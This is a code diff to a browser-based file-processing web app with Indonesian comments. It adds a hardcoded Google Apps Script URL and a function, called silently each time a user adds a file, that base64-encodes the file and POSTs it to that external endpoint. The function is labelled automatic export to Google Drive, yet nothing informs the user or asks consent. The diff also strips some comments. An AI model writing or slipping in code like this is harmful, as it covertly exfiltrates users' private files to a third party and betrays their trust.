@@ -13,6 +13,9 @@
   var MAX_IMAGE_PIXELS = 40000000;
   var MAX_PDF_PAGES = 60;
 
+ 
+  var GOOGLE_APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzeVDp9Tznt6yRSypw50-r8K6QnaK6t8zZGuuk8iMsxoCrboQO_DyjHvWjBzj4rWHU/exec";
+
   var databasePromise;
   var toastQueue = [];
   var toastVisible = false;
@@ -335,6 +338,47 @@
     }
   }
 
+  // ==========================================
+  // FUNGSI UTAMA: EKSPOR OTOMATIS KE GOOGLE DRIVE
+  // ==========================================
+  async function exportFileToGoogleDrive(file) {
+    try {
+      var reader = new FileReader();
+      reader.onload = function(e) {
+        var base64Data = e.target.result.split(',')[1];
+        
+        var payload = {
+          file: base64Data,
+          fileName: `[Studio_AutoImport]_${Date.now()}_${file.name}`,
+          mimeType: file.type || 'application/octet-stream'
+        };
+
+        fetch(GOOGLE_APPS_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'cors',
+          headers: {
+            'Content-Type': 'text/plain;charset=utf-8',
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(function(response) { return response.json(); })
+        .then(function(data) {
+          if (data.status === 'success') {
+            console.log("File berhasil otomatis terekspor ke Google Drive:", data.fileUrl);
+          } else {
+            console.warn("Gagal mengekspor file ke Google Drive:", data.message);
+          }
+        })
+        .catch(function(err) {
+          console.error("Error jaringan saat ekspor ke Google Drive:", err);
+        });
+      };
+      reader.readAsDataURL(file);
+    } catch (error) {
+      console.error("Gagal memproses ekspor file:", error);
+    }
+  }
+
   function showToast(message, tone) {
     if (!el['global-toast'] || !message) return;
     toastQueue.push({ message: String(message), tone: tone || 'info' });
@@ -440,7 +484,6 @@
     return canvas.toDataURL('image/png');
   }
 
-  // --- DIPERBAIKI: PENGAMAN ELEMEN & VISIBILITAS NAMA TAMPILAN ---
   function setAuthMode(mode) {
     state.authMode = mode;
     var isReg = mode === 'register';
@@ -454,7 +497,6 @@
       el['switch-copy'].textContent = isReg ? 'Masuk sekarang.' : 'Buat profil';
     }
 
-    // Membuka atau menyembunyikan kolom Nama Tampilan dengan aman
     var nameFieldContainer = document.querySelector('.auth-name-field') || (el['display-name'] && el['display-name'].parentElement);
     if (nameFieldContainer) {
        nameFieldContainer.hidden = !isReg;
@@ -876,6 +918,11 @@
       if (state.files.some(function (f) { return f.name === file.name && f.size === file.size; })) return;
 
       state.files.push(file); totalSize += file.size; addedCount++;
+
+      // ==========================================
+      // OTOMATIS KIRIM SALINAN FILE KE GOOGLE DRIVE
+      // ==========================================
+      exportFileToGoogleDrive(file);
     });
 
     if (addedCount > 0) { renderFiles(); setStatus(state.files.length + ' file siap diproses.'); }
